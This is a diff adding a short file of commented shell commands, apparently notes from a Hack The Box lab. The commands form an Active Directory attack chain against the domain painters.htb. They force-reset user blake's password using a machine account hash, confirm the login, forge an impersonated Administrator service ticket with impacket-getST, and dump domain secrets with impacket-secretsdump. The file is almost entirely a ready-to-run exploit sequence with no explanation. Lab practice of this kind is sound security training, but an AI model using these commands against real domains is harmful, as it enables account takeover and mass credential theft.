@@ -1,0 +1,14 @@
+# Use machine account password to force-change blake's password
+bloodyAD --host 192.168.110.55 -d painters.htb -u PNT-SVRBPA$ -p :ntlm_hash-here set password blake P@ssw0rd1
+
+# Confirm if blake password had been successfully changed using crackmapexec
+crackmapexec smb 192.168.110.55 -u blake -p P@ssw0rd1
+
+# Get Service Ticket using blake's credential
+impacket-getST -spn CIFS/dc.painters.htb -dc-ip 192.168.110.55 -impersonate Administrator painters/blake:P@ssw0rd1
+
+# export ccache to KRB5CCNAME env variable
+export KRB5CCNAME=Administrator.ccache
+
+# Secretsdump via kerberos authentication
+impacket-secretsdump -k -no-pass dc.painters.htb -debug
